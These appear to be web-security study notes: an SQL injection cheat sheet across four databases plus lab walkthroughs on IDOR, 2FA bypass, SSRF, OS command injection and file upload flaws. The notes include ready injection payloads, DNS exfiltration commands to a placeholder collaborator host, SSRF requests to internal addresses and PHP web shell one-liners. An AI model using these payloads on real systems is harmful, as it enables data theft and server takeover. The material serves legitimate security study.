# SQL Injection Cheat Sheet

This SQL injection cheat sheet provides examples of essential syntax for various tasks associated with SQL injection attacks. Use this guide responsibly and only in controlled, authorized environments.

## String Concatenation

You can combine multiple strings into one:

- **Oracle:** `'foo'||'bar'`
- **Microsoft:** `'foo'+'bar'`
- **PostgreSQL:** `'foo'||'bar'`
- **MySQL:** `'foo' 'bar'` [Note the space between the two strings]
- **MySQL:** `CONCAT('foo','bar')`

## Substring

Extract part of a string from a specified offset with a specified length (1-based index):

- **Oracle:** `SUBSTR('foobar', 4, 2)`
- **Microsoft:** `SUBSTRING('foobar', 4, 2)`
- **PostgreSQL:** `SUBSTRING('foobar', 4, 2)`
- **MySQL:** `SUBSTRING('foobar', 4, 2)`

## Comments

Use comments to truncate a query and remove the following portion:

- **Oracle:** `--comment`
- **Microsoft:** `--comment` or `/*comment*/`
- **PostgreSQL:** `--comment` or `/*comment*/`
- **MySQL:** `#comment` or `-- comment` [Note the space after the double dash] or `/*comment*/`

## Database Version

Determine the database type and version:

- **Oracle:** `SELECT banner FROM v$version` or `SELECT version FROM v$instance`
- **Microsoft:** `SELECT @@version`
- **PostgreSQL:** `SELECT version()`
- **MySQL:** `SELECT @@version`

## Database Contents

List tables and columns in the database:

- **Oracle:** `SELECT * FROM all_tables` and `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
- **Microsoft:** `SELECT * FROM information_schema.tables` and `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- **PostgreSQL:** `SELECT * FROM information_schema.tables` and `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- **MySQL:** `SELECT * FROM information_schema.tables` and `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

table_name, column_name are the individual fields here
## Conditional Errors

Test a boolean condition and trigger a database error if true:

- **Oracle:** `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
- **Microsoft:** `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
- **PostgreSQL:** `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
- **MySQL:** `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

## Extracting Data via Visible Error Messages

Elicit error messages that leak sensitive data from your malicious query:

- **Microsoft:** `SELECT 'foo' WHERE 1 = (SELECT 'secret')` (Example error message provided)

- **PostgreSQL:** `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` (Example error message provided)

- **MySQL:** `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` (Example error message provided)

## Batched (or Stacked) Queries

Execute multiple queries in succession; typically used with blind vulnerabilities:

- **Oracle:** Does not support batched queries.
- **Microsoft:** `QUERY-1-HERE; QUERY-2-HERE` or `QUERY-1-HERE QUERY-2-HERE`
- **PostgreSQL:** `QUERY-1-HERE; QUERY-2-HERE`
- **MySQL:** `QUERY-1-HERE; QUERY-2-HERE` (Note: MySQL batched queries may not work in most cases)

## Time Delays

Introduce a time delay during query processing:

- **Oracle:** `dbms_pipe.receive_message(('a'),10)`
- **Microsoft:** `WAITFOR DELAY '0:0:10'`
- **PostgreSQL:** `SELECT pg_sleep(10)`
- **MySQL:** `SELECT SLEEP(10)`

## Conditional Time Delays

Trigger a time delay based on a boolean condition:

- **Oracle:** `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
- **Microsoft:** `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
- **PostgreSQL:** `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
- **MySQL:** `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`

## DNS Lookup

Perform a DNS lookup to an external domain:

- **Oracle:** Various methods (XXE, elevated privileges)
- **Microsoft:** `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
- **PostgreSQL:** `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
- **MySQL:** Various methods (Windows only)

## DNS Lookup with Data Exfiltration

Perform a DNS lookup with data exfiltration to an external domain:

- **Oracle:** Various methods
- **Microsoft:** `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`
- **PostgreSQL:** Using a custom function (example provided)
- **MySQL:** Windows-only method (example provided)

Use these techniques responsibly and only in controlled, authorized environments. Unauthorized use of SQL injection techniques is illegal and unethical.

## Lab: SQL injection UNION attack, finding a column containing text
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:

	'+UNION+SELECT+NULL,NULL,NULL--
3. Try replacing each null with the random value provided by the lab, for example:

	'+UNION+SELECT+'abcdef',NULL,NULL--
4. If an error occurs, move on to the next null and try that instead.

# Server Side vulnerabilities
## Horizontal Privilege escalation.

https://insecure-website.com/myaccount?id=123
If an attacker modifies the id parameter value to that of another user, they might gain access to another user's account page, and the associated data and functions.

IDOR:  insecure direct object reference (IDOR) vulnerability. This type of vulnerability arises where user-controller parameter values are used to access resources or functions directly.

In some applications, the exploitable parameter does not have a predictable value. For example, instead of an incrementing number, an application might use globally unique identifiers (GUIDs) to identify users. This may prevent an attacker from guessing or predicting another user's identifier. However, the GUIDs belonging to other users might be disclosed elsewhere in the application where users are referenced, such as user messages or reviews.

	Find a blog post by carlos.
	Click on carlos and observe that the URL contains his user ID. Make a note of this ID.
	Log in using the supplied credentials and access your account page.
	Change the "id" parameter to the saved user ID.
	Retrieve and submit the API key.

## Lab: User ID controlled by request parameter with password disclosure

	Log in using the supplied credentials and access the user account page.
	Change the "id" parameter in the URL to administrator.
	View the response in Burp and observe that it contains the administrator's password.
	Log in to the administrator account and delete carlos.

## Authentication vulnerabilities
Authentication vulnerabilities can allow attackers to gain access to sensitive data and functionality. They also expose additional attack surface for further exploits. For this reason, it's important to learn how to identify and exploit authentication vulnerabilities, and how to bypass common protection measures.

![](AuthenticationVulnerabilities.svg)

## Bypassing two-factor authentication
At times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.

If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.

## Server-Side Request Forgery(SSRF)

Vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location. 

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This leaks sensitive data, such as authorization credentials.

## SSRF attacks against the server
In an SSRF attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like 127.0.0.1 (a reserved IP address that points to the loopback adapter) or localhost (a commonly used name for the same adapter).

For example, imagine a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs. It does this by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. When a user views the stock status for an item, their browser makes the following request:

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.

In this example, an attacker can modify the request to specify a URL local to the server:

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
The server fetches the contents of the /admin URL and returns it to the user.

An attacker can visit the /admin URL, but the administrative functionality is normally only accessible to authenticated users. This means an attacker won't see anything of interest. However, if the request to the /admin URL comes from the local machine, the normal access controls are bypassed. The application grants full access to the administrative functionality, because the request appears to originate from a trusted location.

## SSRF attacks against the server - Continued
Why do applications behave in this way, and implicitly trust requests that come from the local machine? This can arise for various reasons:

The access control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server, the check is bypassed.
For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine. This provides a way for an administrator to recover the system if they lose their credentials. This assumes that only a fully trusted user would come directly from the server.
The administrative interface might listen on a different port number to the main application, and might not be reachable directly by users.
These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, often make SSRF into a critical vulnerability.

## SSRF attacks against other back-end systems
In some cases, the application server is able to interact with back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses. The back-end systems are normally protected by the network topology, so they often have a weaker security posture. In many cases, internal back-end systems contain sensitive functionality that can be accessed without authentication by anyone who is able to interact with the systems.

In the previous example, imagine there is an administrative interface at the back-end URL https://192.168.0.68/admin. An attacker can submit the following request to exploit the SSRF vulnerability, and access the administrative interface:

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin

## OS Command Injection
After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system. Below is a summary of some commands that are useful on Linux and Windows platforms:

	Purpose of command	Linux	Windows
	Name of current user	whoami	whoami
	Operating system	uname -a	ver
	Network configuration	ifconfig	ipconfig /all
	Network connections	netstat -an	netstat -an
	Running processes	ps -ef	tasklist

## Injecting OS commands
In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:

	https://insecure-website.com/stockStatus?productID=381&storeID=29
To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:

	stockreport.pl 381 29
This command outputs the stock status for the specified item, which is returned to the user.

## Injecting OS commands
In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:

https://insecure-website.com/stockStatus?productID=381&storeID=29
To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:

stockreport.pl 381 29
This command outputs the stock status for the specified item, which is returned to the user.

## Injecting OS commands - Continued
The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command:

& echo aiwefwlguh &
If this input is submitted in the productID parameter, the command executed by the application is:

stockreport.pl & echo aiwefwlguh & 29
The echo command causes the supplied string to be echoed in the output. This is a useful way to test for some types of OS command injection. The & character is a shell command separator. In this example, it causes three separate commands to execute, one after another. The output returned to the user is:

Error - productID was not provided
aiwefwlguh
29: command not found
The three lines of output demonstrate that:

The original stockreport.pl command was executed without its expected arguments, and so returned an error message.
The injected echo command was executed, and the supplied string was echoed in the output.
The original argument 29 was executed as a command, which caused an error.
Placing the additional command separator & after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.

## What are file upload vulnerabilities?
File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.

## Exploiting unrestricted file uploads to deploy a web shell
From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.

Web shell
A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.

If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

<?php echo file_get_contents('/path/to/target/file'); ?>
Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:

<?php echo system($_GET['command']); ?>
This script enables you to pass an arbitrary system command via a query parameter as follows:

GET /example/exploit.php?command=id HTTP/1.1

## Exploiting flawed validation of file uploads
In the wild, it's unlikely that you'll find a website that has no protection against file upload attacks like we saw in the previous lab. But just because defenses are in place, that doesn't mean that they're robust. You can sometimes still exploit flaws in these mechanisms to obtain a web shell for remote code execution.

## Flawed file type validation
When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type application/x-www-form-url-encoded. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type multipart/form-data is preferred.

## Flawed file type validation - Continued
Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:

	POST /images HTTP/1.1
	Host: normal-website.com
	Content-Length: 12345
	Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

	---------------------------012345678901234567890123456
	Content-Disposition: form-data; name="image"; filename="example.jpg"
	Content-Type: image/jpeg

	[...binary content of example.jpg...]

	---------------------------012345678901234567890123456
	Content-Disposition: form-data; name="description"

	This is an interesting description of my image.

	---------------------------012345678901234567890123456
	Content-Disposition: form-data; name="username"

	wiener
	---------------------------012345678901234567890123456--
As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a Content-Disposition header, which provides some basic information about the input field it relates to. These individual parts may also contain their own Content-Type header, which tells the server the MIME type of the data that was submitted using this input.

One way that websites may attempt to validate file uploads is to check that this input-specific Content-Type header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like image/jpeg and image/png. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater.



